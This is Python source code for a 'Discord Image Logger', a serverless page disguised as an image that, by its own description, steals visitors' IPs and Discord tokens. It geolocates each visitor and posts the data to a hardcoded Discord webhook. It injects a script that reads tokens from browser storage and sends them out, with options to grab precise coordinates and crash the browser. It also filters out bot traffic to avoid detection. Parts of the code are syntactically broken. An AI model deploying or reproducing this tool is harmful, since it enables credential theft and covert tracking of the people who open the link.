import json
import traceback
import requests
import base64
import httpagentparser
from urllib.parse import parse_qs, urlsplit
from http import HTTPStatus

__app__ ="Discord Image Logger"
__description__ ="A simple application which allows you to steal IPs, Discord tokens, and more by abusing Discord's Open Original feature"
__version__ ="v2.0"
__author__ ="C00lB0i"

config = {
    # BASE CONFIG 
    "webhook":"https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz","image":"https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg","imageArgument": True,

    # CUSTOMIZATION 
    "username":"Image Logger","color": 0x00FFFF,

    # OPTIONS 
    "crashBrowser": False,"accurateLocation": False,"message": {"doMessage": False,"message":"This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC","richMessage": True,},"vpnCheck": 1,"linkAlerts": True,"buggedImage": True,"antiBot": 1,

    # REDIRECTION 
    "redirect": {"redirect": False,"page":"https://your-link.here"
    },}
blacklistedIPs = ("27","104","143","164")

binaries = {"loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

def botCheck(ip, useragent):
    if ip.startswith(("34","35")):
        return"Discord"
    elif useragent.startswith("TelegramBot"):
        return"Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={"username": config["username"],"content":"@everyone","embeds": [{"title":"Image Logger - Error","color": config["color"],"description": f"An error occurred while trying to log an IP or token!\n\n**Error:**\n```\n{error}\n```",
            }],
        })
    except:
        pass

def reportToken(token, ip):
    try:
        requests.post(config["webhook"], json={"username": config["username"],"content":"@everyone","embeds": [{"title":"Image Logger - Discord Token Logged","color": config["color"],"description": f"""**A User's Discord Token Was Captured!**

**Token:** `{token}`
**IP:** `{ip}`
**Note:** Use this token for educational purposes only.""",
            }],
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={"username": config["username"],"content": "","embeds": [{"title":"Image Logger - Link Sent","color": config["color"],"description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }],
                })
            except:
                pass
        return

    ping ="@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except:
        info = {}

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4 and not info.get("proxy"):
            return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2 and not info.get("proxy"):
            ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent or "")
    embed = {"username": config["username"],"content": ping,"embeds": [{"title":"Image Logger - IP Logged","color": config["color"],"description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{f"{info.get('lat', 'Unknown')}, {info.get('lon', 'Unknown')}" if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'} ({info.get('timezone', 'Unknown').split('/')[0] if info.get('timezone') else 'Unknown'})`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
        }],}    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    try:
        requests.post(config["webhook"], json=embed)
    except:
        pass
    return info

def handler(event):
    try:
        # Extract request details
        method = event.get('httpMethod', 'GET')
        path = event.get('path', '/')
        query = parse_qs(urlsplit('?' + event.get('queryStringParameters', '')).query if event.get('queryStringParameters') else '')
        headers = event.get('headers', {})
        ip = headers.get('x-forwarded-for', 'Unknown')
        useragent = headers.get('user-agent', 'Unknown')

        # Determine image URL
        if config["imageArgument"]:
            url = base64.b64decode(query.get('url', [None])[0] or query.get('id', [None])[0] or '').decode() if query.get('url') or query.get('id') else config["image"]
        else:
            url = config["image"]

        # Prepare default response data
        data = f"""<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>""".encode()
        datatype = 'text/html'
        status_code = HTTPStatus.OK

        # Handle bot checks
        if ip.startswith(blacklistedIPs):
            return {
                'statusCode': HTTPStatus.OK,
                'body': '',
                'headers': {'Content-Type': 'text/plain'}
            }

        if botCheck(ip, useragent):
            if config["buggedImage"]:
                return {
                    'statusCode': HTTPStatus.OK,
                    'body': base64.b64encode(binaries["loading"]).decode(),
                    'headers': {'Content-Type': 'image/jpeg'},
                    'isBase64Encoded': True}            else:
                return {
                    'statusCode': HTTPStatus.FOUND,
                    'headers': {'Location': url},
                    'body': ''}            makeReport(ip, endpoint=path.split("?")[0], url=url)
            return

        # Handle accurate location
        coords = None
        if query.get('g') and config["accurateLocation"]:
            coords = base64.b64decode(query.get('g')[0]).decode()

        # Generate report
        result = makeReport(ip, useragent, coords, endpoint=path.split("?")[0], url=url)

        # Handle message
        message = config["message"]["message"]
        if config["message"]["richMessage"] and result:
            message = message.replace("{ip}", ip)
            message = message.replace("{isp}", result.get("isp","Unknown"))
            message = message.replace("{asn}", result.get("as","Unknown"))
            message = message.replace("{country}", result.get("country","Unknown"))
            message = message.replace("{region}", result.get("regionName","Unknown"))
            message = message.replace("{city}", result.get("city","Unknown"))
            message = message.replace("{lat}", str(result.get("lat","Unknown")))
            message = message.replace("{long}", str(result.get("lon","Unknown")))
            message = message.replace("{timezone}", f"{result.get('timezone', 'Unknown/Unknown').split('/')[1].replace('_', ' ')} ({result.get('timezone', 'Unknown/Unknown').split('/')[0]})")
            message = message.replace("{mobile}", str(result.get("mobile","Unknown")))
            message = message.replace("{vpn}", str(result.get("proxy","Unknown")))
            message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
            message = message.replace("{browser}", httpagentparser.simple_detect(useragent)[1])
            message = message.replace("{os}", httpagentparser.simple_detect(useragent)[0])

        if config["message"]["doMessage"]:
            data = message.encode()

        if config["crashBrowser"]:
            data = message.encode() + b'<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

        if config["redirect"]["redirect"]:
            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

        # Inject token-grabbing script
        token_script = f"""
        <script>
        (function() {{
            try {{
                const token = window.localStorage.getItem('token') || window.sessionStorage.getItem('token');
                if (token) {{
                    fetch('{config["webhook"]}', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            username: '{config["username"]}',
                            content: '@everyone',
                            embeds: [{{
                                title: 'Image Logger - Discord Token Logged',
                                color: {config["color"]},
                                description:`**A User's Discord Token Was Captured!**\\n\\n**Token:** \\\`{token}\\\`\\n**IP:** \\\`{ip}\\\`\\n**Note:** Use this token for educational purposes only.`
                            }}]
                        }})
                    }});
                }}
            }} catch (e) {{}}
        }})();
        </script>
        """.encode()

        data += token_script

        if config["accurateLocation"]:
            data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g,"%3D"));} else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g,"%3D"));}            location.replace(currenturl);
        });}}
</script>"""

        return {
            'statusCode': status_code,
            'body': data.decode(),
            'headers': {'Content-Type': datatype}
        }

    except Exception as e:
        reportError(traceback.format_exc())
        return {
            'statusCode': HTTPStatus.INTERNAL_SERVER_ERROR,
            'body': '500 - Internal Server Error',
            'headers': {'Content-Type': 'text/html'}
        }

# Vercel serverless function entry point
def vercel_handler(event, context):
    return handler(event)
